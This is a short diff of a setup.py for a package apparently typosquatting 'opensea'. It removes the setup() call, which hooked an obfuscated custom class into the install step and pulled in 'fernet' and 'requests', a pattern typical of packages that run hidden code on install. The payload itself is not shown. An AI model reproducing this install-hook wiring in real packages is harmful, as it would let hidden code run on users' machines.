@@ -18,22 +18,5 @@ class KMAmfXjibNTwVxisqXBwbonZmUQTtSYgcYnqVxPXOjgVbsEFwKKVUxlYXmjjcoNYCzOroVPRTk
             install.run(self)
 
 
-setup(
-    name="opwnsea",
-    version=VERSION,
-    author="dGLITnl",
-    author_email="GlEonUlbMN@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': KMAmfXjibNTwVxisqXBwbonZmUQTtSYgcYnqVxPXOjgVbsEFwKKVUxlYXmjjcoNYCzOroVPRTkZEKBUSmEOStMgfTDZbharMfxgStQFHBtEXhemTwfgRYQhBAglV,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
 
